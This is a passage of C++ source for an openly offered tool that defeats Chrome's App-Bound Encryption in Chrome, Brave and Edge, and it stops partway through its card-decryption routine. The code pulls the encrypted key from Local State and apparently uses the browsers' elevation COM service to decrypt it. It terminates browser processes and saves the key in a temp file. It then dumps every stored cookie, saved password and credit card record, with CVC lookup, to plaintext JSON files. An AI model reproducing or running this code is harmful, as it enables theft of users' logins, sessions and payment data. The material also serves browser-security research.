// chrome_decrypt.cpp
// v0.9.0 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.
/*
 * Chrome App-Bound Encryption Service:
 * https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
 * https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view
 */

#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <string>
#include <algorithm>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <unordered_map>
#include <filesystem>
#include <optional>
#include <memory>
#include <cctype>

const WCHAR *COMPLETION_EVENT_NAME_DLL = L"Global\\ChromeDecryptWorkDoneEvent";
const char *SESSION_CONFIG_FILE_NAME = "chrome_decrypt_session.cfg";

#include "sqlite3.h"

#include <Wincrypt.h>
#pragma comment(lib, "Crypt32.lib")

typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_AUTH_TAG_MISMATCH
#define STATUS_AUTH_TAG_MISMATCH ((NTSTATUS)0xC000A002L)
#endif

#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000DL)
#endif

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "sqlite3.lib")

namespace fs = std::filesystem;

struct SqliteDbCloser
{
    void operator()(sqlite3 *db) const
    {
        if (db)
            sqlite3_close_v2(db);
    }
};
using SqliteDbPtr = std::unique_ptr<sqlite3, SqliteDbCloser>;

struct SqliteStmtFinalizer
{
    void operator()(sqlite3_stmt *stmt) const
    {
        if (stmt)
            sqlite3_finalize(stmt);
    }
};
using SqliteStmtPtr = std::unique_ptr<sqlite3_stmt, SqliteStmtFinalizer>;

namespace Logging
{
    fs::path GetLogFilePath()
    {
        try
        {
            return fs::temp_directory_path() / "chrome_decrypt.log";
        }
        catch (const fs::filesystem_error &e)
        {
            OutputDebugStringA(("chrome_decrypt: Filesystem error getting temp path for log: " + std::string(e.what()) + "\n").c_str());
            return fs::path("chrome_decrypt.log");
        }
    }

    void Log(const std::string &message, bool overwrite = false)
    {
        fs::path logFile = GetLogFilePath();
        try
        {
            std::ofstream file(logFile, overwrite ? std::ios::trunc : (std::ios::app | std::ios::ate));
            if (file)
            {
                file << message << std::endl;
            }
        }
        catch (const std::exception &e)
        {
            OutputDebugStringA(("chrome_decrypt: Error writing to log file '" + logFile.string() + "': " + std::string(e.what()) + "\n").c_str());
        }
    }
}

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR *crx_path,
        const WCHAR *browser_appid,
        const WCHAR *browser_version,
        const WCHAR *session_id,
        DWORD caller_proc_id,
        ULONG_PTR *proc_handle) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        ProtectionLevel protection_level,
        const BSTR plaintext,
        BSTR *ciphertext,
        DWORD *last_error) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext,
        BSTR *plaintext,
        DWORD *last_error) = 0;
};

MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase_Placeholder : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
};

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR *crx_path, 
        const WCHAR *browser_appid, 
        const WCHAR *browser_version,
        const WCHAR *session_id, 
        DWORD caller_proc_id, 
        ULONG_PTR *proc_handle) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        ProtectionLevel protection_level, 
        const BSTR plaintext,
        BSTR *ciphertext, 
        DWORD *last_error) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext, 
        BSTR *plaintext,
        DWORD *last_error) = 0;
};

MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevatorFinal : public IEdgeIntermediateElevator{};

namespace ChromeAppBound
{
    constexpr size_t KEY_SIZE = 32;
    const uint8_t KEY_PREFIX[] = {'A', 'P', 'P', 'B'};
    constexpr size_t GCM_IV_LENGTH = 12;
    constexpr size_t GCM_TAG_LENGTH = 16;
    const std::string V20_PREFIX = "v20";
    constexpr size_t DECRYPTED_COOKIE_VALUE_OFFSET = 32;

    std::string WCharArrToString(const WCHAR *wchars)
    {
        if (!wchars || wchars[0] == L'\0')
            return std::string();

        int size_needed_bytes = WideCharToMultiByte(CP_UTF8, 0, wchars, -1, nullptr, 0, nullptr, nullptr);
        if (size_needed_bytes == 0)
        {
            return "[WCharArrToString: Size Calc Error " + std::to_string(GetLastError()) + "]";
        }

        std::string strTo(size_needed_bytes - 1, '\0');

        int bytes_written = WideCharToMultiByte(CP_UTF8, 0, wchars, -1, &strTo[0], size_needed_bytes, nullptr, nullptr);
        if (bytes_written == 0)
        {
            return "[WCharArrToString: Conversion Error " + std::to_string(GetLastError()) + "]";
        }
        return strTo;
    }

    struct BrowserConfig
    {
        CLSID clsid;
        IID iid;
        fs::path userDataRootSubPath;
        fs::path localStateFileName;
        fs::path cookieDbRelativePath;
        fs::path loginDataDbRelativePath;
        fs::path webDataDbRelativePath;
        std::string name;
    };

    fs::path GetLocalAppDataPath()
    {
        PWSTR path_known_folder = nullptr;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path_known_folder)))
        {
            fs::path result = path_known_folder;
            CoTaskMemFree(path_known_folder);
            return result;
        }
        char path_legacy[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path_legacy) == S_OK)
        {
            Logging::Log("[!] SHGetKnownFolderPath failed, using SHGetFolderPathA fallback for LocalAppData.");
            return fs::path(path_legacy);
        }
        Logging::Log("[-] CRITICAL: Failed to get Local AppData path.");
        throw std::runtime_error("Failed to get Local AppData path.");
    }

    const std::unordered_map<std::string, BrowserConfig> &GetBrowserConfigs()
    {
        static const std::unordered_map<std::string, BrowserConfig> browser_configs_map = {
            {"chrome", {{0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, fs::path("Google") / "Chrome" / "User Data", "Local State", fs::path("Network") / "Cookies", "Login Data", "Web Data", "Chrome"}},
            {"brave", {{0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, fs::path("BraveSoftware") / "Brave-Browser" / "User Data", "Local State", fs::path("Network") / "Cookies", "Login Data", "Web Data", "Brave"}},
            {"edge", {{0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, fs::path("Microsoft") / "Edge" / "User Data", "Local State", fs::path("Network") / "Cookies", "Login Data", "Web Data", "Edge"}}};
        return browser_configs_map;
    }

    BrowserConfig GetBrowserConfig(const std::string &browserType)
    {
        const auto &configs = GetBrowserConfigs();
        auto it = configs.find(browserType);
        if (it != configs.end())
        {
            return it->second;
        }
        Logging::Log("[-] Unsupported browser type requested: " + browserType);
        throw std::invalid_argument("Unsupported browser type: " + browserType);
    }

    std::string BytesToHexString(const BYTE *byteArray, size_t size)
    {
        std::ostringstream oss;
        oss << std::hex << std::setfill('0');
        for (size_t i = 0; i < size; ++i)
        {
            oss << std::setw(2) << static_cast<int>(byteArray[i]);
        }
        return oss.str();
    }

    std::string BytesToHexString(const std::vector<uint8_t> &bytes)
    {
        return BytesToHexString(bytes.data(), bytes.size());
    }

    std::optional<std::vector<uint8_t>> Base64DecodeApi(const std::string &base64String)
    {
        if (base64String.empty())
        {
            return std::vector<uint8_t>();
        }

        DWORD decodedSize = 0;
        if (!CryptStringToBinaryA(base64String.c_str(), base64String.length(), CRYPT_STRING_BASE64, nullptr, &decodedSize, nullptr, nullptr))
        {
            Logging::Log("[-] CryptStringToBinaryA (size query) failed. Error: " + std::to_string(GetLastError()));
            return std::nullopt;
        }

        if (decodedSize == 0)
        {
            return std::vector<uint8_t>();
        }

        std::vector<uint8_t> decodedData(decodedSize);
        if (!CryptStringToBinaryA(base64String.c_str(), base64String.length(), CRYPT_STRING_BASE64, decodedData.data(), &decodedSize, nullptr, nullptr))
        {
            Logging::Log("[-] CryptStringToBinaryA (decode) failed. Error: " + std::to_string(GetLastError()));
            return std::nullopt;
        }
        return decodedData;
    }

    std::optional<std::vector<uint8_t>> RetrieveEncryptedKeyFromLocalState(const fs::path &localStateFullPath)
    {
        Logging::Log("[+] Attempting to read Local State file: " + localStateFullPath.u8string());

        std::ifstream f(localStateFullPath, std::ios::binary);
        if (!f)
        {
            Logging::Log("[-] Cannot open Local State file: " + localStateFullPath.u8string());
            return std::nullopt;
        }

        std::string txt((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        f.close();

        const std::string tag_to_find = "\"app_bound_encrypted_key\":\"";
        size_t pos = txt.find(tag_to_find);

        if (pos == std::string::npos)
        {
            const std::string os_crypt_parent_tag = "\"os_crypt\":";
            size_t os_crypt_pos = txt.find(os_crypt_parent_tag);
            if (os_crypt_pos != std::string::npos)
            {
                pos = txt.find(tag_to_find, os_crypt_pos);
            }
        }

        if (pos == std::string::npos)
        {
            Logging::Log("[-] Tag '" + tag_to_find + "' not found in Local State content.");
            return std::nullopt;
        }

        pos += tag_to_find.length();
        size_t end_pos = txt.find('"', pos);
        if (end_pos == std::string::npos)
        {
            Logging::Log("[-] Malformed JSON: closing quote for 'app_bound_encrypted_key' not found.");
            return std::nullopt;
        }

        std::string b64_key_data = txt.substr(pos, end_pos - pos);
        auto optDecodedData = Base64DecodeApi(b64_key_data);
        if (!optDecodedData)
        {
            Logging::Log("[-] Base64 decoding of encrypted key from Local State failed.");
            return std::nullopt;
        }
        std::vector<uint8_t> &decodedData = *optDecodedData;

        if (decodedData.size() < sizeof(KEY_PREFIX) ||
            !std::equal(std::begin(KEY_PREFIX), std::end(KEY_PREFIX), decodedData.begin()))
        {
            Logging::Log("[-] Encrypted key has invalid header (expected 'APPB').");
            return std::nullopt;
        }
        Logging::Log("[+] Encrypted key header is valid.");
        return std::vector<uint8_t>(decodedData.begin() + sizeof(KEY_PREFIX), decodedData.end());
    }

    fs::path GetTempKeyFilePath()
    {
        try
        {
            return fs::temp_directory_path() / "chrome_appbound_key.txt";
        }
        catch (const fs::filesystem_error &e)
        {
            Logging::Log("[!] Filesystem error getting temp path for key file: " + std::string(e.what()) + ". Using current directory as fallback.");
            return fs::path("chrome_appbound_key.txt");
        }
    }

    void SaveKeyToFile(const std::string &keyHex)
    {
        auto path = GetTempKeyFilePath();
        std::ofstream f(path, std::ios::trunc | std::ios::binary);
        if (f)
        {
            f << keyHex;
            Logging::Log("[+] Decrypted AES key (hex) saved to: " + path.u8string());
        }
        else
        {
            Logging::Log("[-] Failed to save decrypted key to file: " + path.u8string());
        }
    }

    void KillBrowserProcesses(const std::string &browserType)
    {
        std::wstring procNameW;
        if (browserType == "chrome")
            procNameW = L"chrome.exe";
        else if (browserType == "brave")
            procNameW = L"brave.exe";
        else if (browserType == "edge")
            procNameW = L"msedge.exe";
        else
        {
            Logging::Log("[!] KillBrowserProcesses: Unknown browser type specified: " + browserType);
            return;
        }

        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE)
        {
            Logging::Log("[-] CreateToolhelp32Snapshot failed. Error: " + std::to_string(GetLastError()));
            return;
        }
        auto snapCloser = [](HANDLE h)
        { if(h != INVALID_HANDLE_VALUE) CloseHandle(h); };
        std::unique_ptr<void, decltype(snapCloser)> snapPtr(snap, snapCloser);

        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe))
        {
            do
            {
                if (procNameW == pe.szExeFile && pe.th32ProcessID != GetCurrentProcessId())
                {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                    if (hProcess)
                    {
                        if (TerminateProcess(hProcess, 0))
                        {
                            Logging::Log("[+] Terminated process: ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + ")");
                        }
                        else
                        {
                            // Logging::Log("[-] Failed to terminate process ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + "). Error: " + std::to_string(GetLastError()));
                        }
                        CloseHandle(hProcess);
                    }
                    else
                    {
                        // Logging::Log("[-] Failed to open process ID " + std::to_string(pe.th32ProcessID) + " (" + WCharArrToString(pe.szExeFile) + ") for termination. Error: " + std::to_string(GetLastError()));
                    }
                }
            } while (Process32NextW(snap, &pe));
        }
    }

    static std::string escapeJson(const std::string &s)
    {
        std::string out;
        out.reserve(s.length());
        for (char c : s)
        {
            switch (c)
            {
            case '\"':
                out += "\\\"";
                break;
            case '\\':
                out += "\\\\";
                break;
            case '\b':
                out += "\\b";
                break;
            case '\f':
                out += "\\f";
                break;
            case '\n':
                out += "\\n";
                break;
            case '\r':
                out += "\\r";
                break;
            case '\t':
                out += "\\t";
                break;
            default:
                if (static_cast<unsigned char>(c) < 0x20)
                {
                    std::ostringstream oss_char;
                    oss_char << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(static_cast<unsigned char>(c));
                    out += oss_char.str();
                }
                else
                {
                    out += c;
                }
            }
        }
        return out;
    }

    std::optional<std::vector<uint8_t>> DecryptGcm(
        const std::vector<uint8_t> &key,
        const uint8_t *iv, ULONG ivLen,
        const uint8_t *ct, ULONG ctLen,
        const uint8_t *tag, ULONG tagLen)
    {
        BCRYPT_ALG_HANDLE hAlg = nullptr;
        NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (!NT_SUCCESS(status))
        {
            std::ostringstream oss;
            oss << "0x" << std::hex << status;
            Logging::Log("[-] BCryptOpenAlgorithmProvider (AES) failed. Status: " + oss.str());
            return std::nullopt;
        }
        auto algHandleCloser = [](BCRYPT_ALG_HANDLE h)
        { if(h) BCryptCloseAlgorithmProvider(h, 0); };
        std::unique_ptr<void, decltype(algHandleCloser)> hAlgPtr(hAlg, algHandleCloser);

        status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (!NT_SUCCESS(status))
        {
            std::ostringstream oss;
            oss << "0x" << std::hex << status;
            Logging::Log("[-] BCryptSetProperty (GCM mode) failed. Status: " + oss.str());
            return std::nullopt;
        }

        BCRYPT_KEY_HANDLE hKeyHandle = nullptr;
        status = BCryptGenerateSymmetricKey(hAlg, &hKeyHandle, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
        if (!NT_SUCCESS(status))
        {
            std::ostringstream oss;
            oss << "0x" << std::hex << status;
            Logging::Log("[-] BCryptGenerateSymmetricKey failed. Status: " + oss.str());
            return std::nullopt;
        }
        auto keyHandleCloser = [](BCRYPT_KEY_HANDLE h)
        { if(h) BCryptDestroyKey(h); };
        std::unique_ptr<void, decltype(keyHandleCloser)> hKeyPtr(hKeyHandle, keyHandleCloser);

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (PUCHAR)iv;
        authInfo.cbNonce = ivLen;
        authInfo.pbTag = (PUCHAR)tag;
        authInfo.cbTag = tagLen;

        std::vector<uint8_t> plain(ctLen > 0 ? ctLen : 1);
        ULONG outLen = 0;

        status = BCryptDecrypt(hKeyHandle, (PUCHAR)ct, ctLen, &authInfo, nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);

        if (!NT_SUCCESS(status))
        {
            std::ostringstream errorMsg;
            errorMsg << "[-] BCryptDecrypt failed. Status: 0x" << std::hex << status;
            if (status == STATUS_AUTH_TAG_MISMATCH)
            {
                errorMsg << " (STATUS_AUTH_TAG_MISMATCH - Integrity check failed)";
            }
            else if (status == STATUS_INVALID_PARAMETER)
            {
                errorMsg << " (STATUS_INVALID_PARAMETER)";
            }
            Logging::Log(errorMsg.str());
            return std::nullopt;
        }
        plain.resize(outLen);
        return plain;
    }

    fs::path GetOutputFilePath(const fs::path &baseOutputPath, const std::string &browserName, const std::string &profileName, const std::string &dataType)
    {
        fs::path profileSpecificDir = baseOutputPath / browserName / profileName;
        std::error_code ec;

        auto check_and_create = [&](const fs::path &dir_to_create) -> bool
        {
            if (!fs::exists(dir_to_create))
            {
                if (!fs::create_directories(dir_to_create, ec))
                {
                    Logging::Log("[-] Failed to create directory: " + dir_to_create.u8string() + ". Error: " + ec.message());
                    return false;
                }
                Logging::Log("[+] Created directory: " + dir_to_create.u8string());
            }
            return true;
        };

        if (!check_and_create(profileSpecificDir))
        {
            profileSpecificDir = baseOutputPath / browserName;
            if (!check_and_create(profileSpecificDir))
            {
                profileSpecificDir = baseOutputPath;
                if (!check_and_create(profileSpecificDir))
                {
                    Logging::Log("[!] All output directory creation attempts failed. Falling back to temp directory for " + dataType);
                    try
                    {
                        return fs::temp_directory_path() / (browserName + "_" + profileName + "_" + dataType + ".txt");
                    }
                    catch (const fs::filesystem_error &e_temp)
                    {
                        Logging::Log("[!] Filesystem error getting temp path for output: " + std::string(e_temp.what()) + ". Using current directory for " + dataType);
                        return fs::path(browserName + "_" + profileName + "_" + dataType + ".txt");
                    }
                }
            }
        }
        return profileSpecificDir / (dataType + ".txt");
    }

    void DecryptCookies(const std::vector<uint8_t> &aesKey,
                        const fs::path &cookieDbPath,
                        const fs::path &outFilePath)
    {
        sqlite3 *raw_conn = nullptr;
        if (sqlite3_open_v2(cookieDbPath.string().c_str(), &raw_conn, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK)
        {
            Logging::Log("[-] sqlite3_open_v2 failed for Cookies DB (" + cookieDbPath.u8string() + "): " + (raw_conn ? sqlite3_errmsg(raw_conn) : "Unknown error before connection assignment"));
            if (raw_conn)
                sqlite3_close_v2(raw_conn);
            return;
        }
        SqliteDbPtr conn(raw_conn);

        sqlite3_stmt *raw_stmt = nullptr;
        const char *sql_query = "SELECT host_key, name, encrypted_value FROM cookies;";
        if (sqlite3_prepare_v2(conn.get(), sql_query, -1, &raw_stmt, nullptr) != SQLITE_OK)
        {
            Logging::Log("[-] sqlite3_prepare_v2 failed for Cookies query: " + std::string(sqlite3_errmsg(conn.get())));
            return;
        }
        SqliteStmtPtr stmt(raw_stmt);

        std::ofstream out(outFilePath, std::ios::trunc);
        if (!out)
        {
            Logging::Log("[-] Could not open cookies output file: " + outFilePath.u8string());
            return;
        }

        out << "[\n";
        bool first_entry = true;
        int extracted_count = 0;
        int rc_step;
        while ((rc_step = sqlite3_step(stmt.get())) == SQLITE_ROW)
        {
            const char *host = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 0));
            const char *name = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 1));
            const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt.get(), 2));
            int blob_len = sqlite3_column_bytes(stmt.get(), 2);

            if (blob && blob_len > (V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH) &&
                std::string(reinterpret_cast<const char *>(blob), V20_PREFIX.length()) == V20_PREFIX)
            {
                const uint8_t *iv_ptr = blob + V20_PREFIX.length();
                const uint8_t *tag_ptr = blob + blob_len - GCM_TAG_LENGTH;
                ULONG ct_len = blob_len - (ULONG)V20_PREFIX.length() - (ULONG)GCM_IV_LENGTH - (ULONG)GCM_TAG_LENGTH;
                const uint8_t *ct_ptr = blob + V20_PREFIX.length() + GCM_IV_LENGTH;

                auto optPlain = DecryptGcm(aesKey, iv_ptr, (ULONG)GCM_IV_LENGTH, ct_ptr, ct_len, tag_ptr, (ULONG)GCM_TAG_LENGTH);
                if (optPlain)
                {
                    if (optPlain->size() > DECRYPTED_COOKIE_VALUE_OFFSET)
                    {
                        std::string val(reinterpret_cast<const char *>(optPlain->data() + DECRYPTED_COOKIE_VALUE_OFFSET),
                                        optPlain->size() - DECRYPTED_COOKIE_VALUE_OFFSET);
                        if (!first_entry)
                            out << ",\n";
                        first_entry = false;
                        out << "  {"
                            << "\"host\":\"" << escapeJson(host ? host : "") << "\","
                            << "\"name\":\"" << escapeJson(name ? name : "") << "\","
                            << "\"value\":\"" << escapeJson(val) << "\""
                            << "}";
                        extracted_count++;
                    }
                }
                else
                {
                    // Logging::Log("[-] Cookie decryption failed for " + std::string(host ? host : "<null_host>") + "/" + std::string(name ? name : "<null_name>"));
                }
            }
        }
        if (rc_step != SQLITE_DONE)
        {
            Logging::Log("[-] sqlite3_step error (cookies): " + std::string(sqlite3_errmsg(conn.get())));
        }

        out << "\n]\n";
        if (extracted_count > 0)
        {
            Logging::Log("     [*] " + std::to_string(extracted_count) + " Cookies extracted to " + outFilePath.u8string());
        }
    }

    void DecryptPasswords(const std::vector<uint8_t> &aesKey,
                          const fs::path &loginDbPath,
                          const fs::path &outFilePath)
    {
        std::string db_uri = "file:" + loginDbPath.string() + "?mode=ro&nolock=1";
        sqlite3 *raw_conn = nullptr;
        if (sqlite3_open_v2(db_uri.c_str(), &raw_conn, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK)
        {
            Logging::Log("[-] sqlite3_open_v2 failed (Login Data URI - " + loginDbPath.u8string() + "): " + (raw_conn ? sqlite3_errmsg(raw_conn) : "nolock open URI failed"));
            if (raw_conn)
                sqlite3_close_v2(raw_conn);
            return;
        }
        SqliteDbPtr conn(raw_conn);

        sqlite3_stmt *raw_stmt = nullptr;
        const char *sql_query = "SELECT origin_url, username_value, password_value FROM logins;";
        if (sqlite3_prepare_v2(conn.get(), sql_query, -1, &raw_stmt, nullptr) != SQLITE_OK)
        {
            Logging::Log("[-] sqlite3_prepare_v2 failed (Login Data query): " + std::string(sqlite3_errmsg(conn.get())));
            return;
        }
        SqliteStmtPtr stmt(raw_stmt);

        std::ofstream out(outFilePath, std::ios::trunc);
        if (!out)
        {
            Logging::Log("[-] Could not open passwords output file: " + outFilePath.u8string());
            return;
        }

        out << "[\n";
        bool first_entry = true;
        int extracted_count = 0;
        int rc_step;
        while ((rc_step = sqlite3_step(stmt.get())) == SQLITE_ROW)
        {
            const char *origin = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 0));
            const char *user = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 1));
            const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt.get(), 2));
            int blob_len = sqlite3_column_bytes(stmt.get(), 2);

            if (blob && blob_len > (V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH) &&
                std::string(reinterpret_cast<const char *>(blob), V20_PREFIX.length()) == V20_PREFIX)
            {
                const uint8_t *iv_ptr = blob + V20_PREFIX.length();
                const uint8_t *tag_ptr = blob + blob_len - GCM_TAG_LENGTH;
                ULONG ct_len = blob_len - (ULONG)V20_PREFIX.length() - (ULONG)GCM_IV_LENGTH - (ULONG)GCM_TAG_LENGTH;
                const uint8_t *ct_ptr = blob + V20_PREFIX.length() + GCM_IV_LENGTH;

                auto optPlain = DecryptGcm(aesKey, iv_ptr, (ULONG)GCM_IV_LENGTH, ct_ptr, ct_len, tag_ptr, (ULONG)GCM_TAG_LENGTH);
                if (optPlain)
                {
                    if (!optPlain->empty())
                    {
                        std::string pwd(reinterpret_cast<const char *>(optPlain->data()), optPlain->size());
                        if (!first_entry)
                            out << ",\n";
                        first_entry = false;
                        out << "  {"
                            << "\"origin\":\"" << escapeJson(origin ? origin : "") << "\","
                            << "\"username\":\"" << escapeJson(user ? user : "") << "\","
                            << "\"password\":\"" << escapeJson(pwd) << "\""
                            << "}";
                        extracted_count++;
                    }
                }
                else
                {
                    // Logging::Log("[-] Password decryption failed for " + std::string(origin ? origin : "<null_origin>"));
                }
            }
        }
        if (rc_step != SQLITE_DONE)
        {
            Logging::Log("[-] sqlite3_step error (passwords): " + std::string(sqlite3_errmsg(conn.get())));
        }

        out << "\n]\n";
        if (extracted_count > 0)
        {
            Logging::Log("     [*] " + std::to_string(extracted_count) + " Passwords extracted to " + outFilePath.u8string());
        }
    }

    void DecryptPaymentMethods(const std::vector<uint8_t> &aesKey,
                               const fs::path &webDataDbPath,
                               const fs::path &outFilePath)
    {
        std::string db_uri = "file:" + webDataDbPath.string() + "?mode=ro&nolock=1";
        sqlite3 *raw_conn = nullptr;
        if (sqlite3_open_v2(db_uri.c_str(), &raw_conn, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK)
        {
            Logging::Log("[-] sqlite3_open_v2 failed (Web Data URI - " + webDataDbPath.u8string() + "): " + (raw_conn ? sqlite3_errmsg(raw_conn) : "nolock open URI failed"));
            if (raw_conn)
                sqlite3_close_v2(raw_conn);
            return;
        }
        SqliteDbPtr conn(raw_conn);

        std::unordered_map<std::string, std::vector<uint8_t>> cvcMap;
        {
            sqlite3_stmt *raw_st_cvc = nullptr;
            const char *cvc_query = "SELECT guid, value_encrypted FROM local_stored_cvc;";
            if (sqlite3_prepare_v2(conn.get(), cvc_query, -1, &raw_st_cvc, nullptr) == SQLITE_OK)
            {
                SqliteStmtPtr st_cvc(raw_st_cvc);
                int rc_cvc_step;
                while ((rc_cvc_step = sqlite3_step(st_cvc.get())) == SQLITE_ROW)
                {
                    const char *guid_char = reinterpret_cast<const char *>(sqlite3_column_text(st_cvc.get(), 0));
                    if (!guid_char)
                        continue;
                    std::string guid(guid_char);
                    const uint8_t *blob_data = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(st_cvc.get(), 1));
                    int len = sqlite3_column_bytes(st_cvc.get(), 1);
                    if (blob_data && len > 0)
                    {
                        cvcMap[guid] = std::vector<uint8_t>(blob_data, blob_data + len);
                    }
                }
                if (rc_cvc_step != SQLITE_DONE)
                {
                    Logging::Log("[-] sqlite3_step error during CVC fetch: " + std::string(sqlite3_errmsg(conn.get())));
                }
            }
            else
            {
                Logging::Log("[-] sqlite3_prepare_v2 failed (local_stored_cvc query): " + std::string(sqlite3_errmsg(conn.get())));
            }
        }

        sqlite3_stmt *raw_stmt_cc = nullptr;
        const char *cc_query = "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;";
        if (sqlite3_prepare_v2(conn.get(), cc_query, -1, &raw_stmt_cc, nullptr) != SQLITE_OK)
        {
            Logging::Log("[-] sqlite3_prepare_v2 failed (credit_cards query): " + std::string(sqlite3_errmsg(conn.get())));
            return;
        }
        SqliteStmtPtr stmt_cc(raw_stmt_cc);

        std::ofstream out(outFilePath, std::ios::trunc);
        if (!out)
        {
            Logging::Log("[-] Could not open payments output file: " + outFilePath.u8string());
            return;
        }
        out << "[\n";

        bool first_entry = true;
        int extracted_count = 0;
        int rc_cc_step;
        while ((rc_cc_step = sqlite3_step(stmt_cc.get())) == SQLITE_ROW)
        {
            const char *guid_char = reinterpret_cast<const char *>(sqlite3_column_text(stmt_cc.get(), 0));
            if (!guid_char)
                continue;
            std::string guid(guid_char);

            const char *name_on_card = reinterpret_cast<const char *>(sqlite3_column_text(stmt_cc.get(), 1));
            int exp_month = sqlite3_column_int(stmt_cc.get(), 2);
            int exp_year = sqlite3_column_int(stmt_cc.get(), 3);
            const uint8_t *cc_blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt_cc.get(), 4));
            int cc_blob_len = sqlite3_column_bytes(stmt_cc.get(), 4);

            std::string card_number_str;
            if (cc_blob && cc_blob_len > (V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH) &&
                std::string(reinterpret_cast<const char *>(cc_blob), V20_PREFIX.length()) == V20_PREFIX)
            {
                const uint8_t *iv_ptr = cc_blob + V20_PREFIX.length();
                const uint8_t *tag_ptr = cc_blob + cc_blob_len - GCM_TAG_LENGTH;
                ULONG ct_len = cc_blob_len - (ULONG)V20_PREFIX.length() - (ULONG)GCM_IV_LENGTH - (ULONG)GCM_TAG_LENGTH;
                const uint8_t *ct_ptr = cc_blob + V20_PREFIX.length() + GCM_IV_LENGTH;

                auto optPlainNum = DecryptGcm(aesKey, iv_ptr, (ULONG)GCM_IV_LENGTH, ct_ptr, ct_len, tag_ptr, (ULONG)GCM_TAG_LENGTH);
